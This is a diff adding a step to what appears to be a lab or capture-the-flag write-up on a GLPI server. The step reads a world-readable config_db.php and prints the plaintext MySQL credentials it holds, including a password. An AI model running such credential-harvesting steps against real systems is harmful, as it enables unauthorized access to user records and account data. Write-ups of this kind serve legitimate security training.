@@ -837,6 +837,7 @@ ls -la /opt/glpi/config/
 <br>
 </div>
 
+#### What is glpi and what is it's role here?
 <div align="center">
 <br>
 ※※※※※※※※※※※※※※※※※※※※※※※※
@@ -844,7 +845,28 @@ ls -la /opt/glpi/config/
 <br>
 </div>
 
+### 4.3 Extract GLPI database credentials
 
+**Why this step:** With `config_db.php` world-readable, read it to obtain GLPI’s database credentials for direct access to its MySQL store.
+
+**Command:**
+
+```shell
+cat /opt/glpi/config/config_db.php
+```
+
+**Result:**
+
+```php
+public $dbhost     = '127.0.0.1';
+public $dbuser     = 'glpi';
+public $dbpassword = '8rhu0L6Pw4Y7';
+public $dbdefault  = 'glpidb';
+```
+
+**What this gives you:** Plaintext MySQL credentials. **Key finding:** GLPI authenticates to MySQL as `glpi` / `8rhu0L6Pw4Y7` against the `glpidb` database on localhost. These credentials grant direct read access to all GLPI data, including user records and LDAP integration settings.
+
+**Next:** Connect to the database and locate authentication-related tables.
 <div align="center">
 <br>
 <br>
